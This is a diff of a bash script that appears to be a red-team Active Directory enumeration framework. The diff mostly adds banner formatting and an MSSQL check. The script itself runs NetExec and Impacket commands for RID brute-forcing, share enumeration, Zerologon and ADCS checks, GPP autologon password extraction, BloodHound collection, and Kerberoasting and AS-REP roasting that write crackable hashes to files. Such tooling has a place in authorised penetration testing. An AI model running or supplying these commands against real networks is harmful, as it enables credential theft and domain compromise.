@@ -17,12 +17,17 @@ banner() {
     echo
 }
 
+# Matches the Purple/Magenta ">>>" style from your screenshots
+sub_banner() {
+    echo -e "${BOLD}${MAGENTA}>>> $1 ...${NC}"
+}
+
 success() { echo -e "${GREEN}[+] $1${NC}"; }
 warn()    { echo -e "${YELLOW}[!] $1${NC}"; }
 error()   { echo -e "${RED}[-] $1${NC}"; }
 
 echo "======================================================"
-echo "   RedBlue_Frank_ADenum.sh - AD Enumeration Framework"
+echo "    RedBlue_Frank_ADenum.sh - AD Enumeration Framework"
 echo "======================================================"
 
 # ---------------- INPUTS ----------------
@@ -92,28 +97,29 @@ if $VALID_CREDS; then
     case $OPTION in
 
         1)
-            banner "PROTOCOL REACHABILITY CHECK"
+            sub_banner "PROTOCOL REACHABILITY CHECK"
             nxc smb "$DOMAIN"
             nxc ldap "$DOMAIN" --port 389
             nxc winrm "$DOMAIN"
             nxc rdp "$DOMAIN"
+            nxc mssql "$DCIP" -u "$USER" -p "$PASS"
             ;;
 
         2)
-            banner "RID BRUTE"
+            sub_banner "RID BRUTE"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute | grep 'SidTypeUser'
 
-            banner "LDAP USERS"
+            sub_banner "LDAP USERS"
             nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users
             ;;
 
         3)
-            banner "SMB SHARE ENUMERATION"
+            sub_banner "SMB SHARE ENUMERATION"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares
             ;;
 
         4)
-            banner "ADCS ENUMERATION"
+            sub_banner "ADCS ENUMERATION"
             ADCS_OUT=$(nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M adcs)
             echo "$ADCS_OUT"
 
@@ -126,23 +132,23 @@ if $VALID_CREDS; then
             ;;
 
         5)
-            banner "PRE-WINDOWS 2000 ACCOUNTS"
+            sub_banner "PRE-WINDOWS 2000 ACCOUNTS"
             nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M pre2k
             ;;
 
         6)
-            banner "ZEROLOGON CHECK"
+            sub_banner "ZEROLOGON CHECK"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M zerologon
             ;;
 
         7)
-            banner "GPP AUTOLOGON"
+            sub_banner "GPP AUTOLOGON"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin
             ;;
 
         8)
             read -rp "$(echo -e ${YELLOW}'[?] DNS Server IP: '${NC})" DNSIP
-            banner "BLOODHOUND COLLECTION"
+            sub_banner "BLOODHOUND COLLECTION"
 
             nxc ldap "$DC" --port 389 -u "$USER" -p "$PASS" \
                 --bloodhound --collection All --dns-server "$DNSIP"
@@ -152,7 +158,7 @@ if $VALID_CREDS; then
             ;;
 
         9)
-            banner "KERBEROASTING"
+            sub_banner "KERBEROASTING"
             GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile Kerb_hashes.txt
 
             if [[ -s Kerb_hashes.txt ]]; then
@@ -164,7 +170,7 @@ if $VALID_CREDS; then
             ;;
 
         10)
-            banner "BLIND KERBEROASTING"
+            sub_banner "BLIND KERBEROASTING"
 
             if [[ ! -f users_auto.txt ]]; then
                 warn "users_auto.txt not found – generating from LDAP"
@@ -183,7 +189,7 @@ if $VALID_CREDS; then
             ;;
 
         11)
-            banner "AS-REP ROASTING"
+            sub_banner "AS-REP ROASTING"
 
             if [[ ! -f users_auto.txt ]]; then
                 warn "users_auto.txt not found – generating from LDAP"
@@ -204,34 +210,45 @@ if $VALID_CREDS; then
         12)
             banner "RUN ALL – FULLY AUTOMATED ENUMERATION"
 
+            sub_banner "Protocol Reachability Check"
             nxc smb "$DOMAIN"
             nxc ldap "$DOMAIN" --port 389
             nxc winrm "$DOMAIN"
             nxc rdp "$DOMAIN"
+            nxc mssql "$DCIP" -u "$USER" -p "$PASS"
 
+            sub_banner "SMB Share Enumeration"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares
+
+            sub_banner "RID BRUTE"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute | grep 'SidTypeUser'
 
+            sub_banner "LDAP USERS"
             nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users \
                 | tee >(awk '/^[A-Za-z0-9]/ {print $1}' > users_auto.txt)
 
+            sub_banner "Pre-Windows 2000 Account Check"
             nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M pre2k
 
+            sub_banner "ADCS Enumeration"
             nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M adcs
 
+            sub_banner "GPP AutoLogon Check"
             nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin
 
+            sub_banner "BloodHound Collection"
             nxc ldap "$DC" --port 389 -u "$USER" -p "$PASS" \
                 --bloodhound --collection All --dns-server "$DCIP"
-
+            
             ZIP=$(ls -t ~/.nxc/logs/*bloodhound.zip 2>/dev/null | head -n 1)
-            [[ -f "$ZIP" ]] && cp "$ZIP" .
+            [[ -f "$ZIP" ]] && cp "$ZIP" . && success "Collected BloodHound ZIP"
 
+            sub_banner "Kerberoasting & AS-REP Roasting"
             GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile Kerb_hashes.txt
             GetUserSPNs.py "$DOMAIN/" -usersfile users_auto.txt -dc-host "$DCIP" -no-preauth -outputfile Hash_krb5tgs
             GetNPUsers.py "$DOMAIN/" -usersfile users_auto.txt -format hashcat -output AS_hashes.txt
 
-            success "RUN ALL COMPLETE"
+            banner "RUN ALL COMPLETE"
             ;;
 
         0)
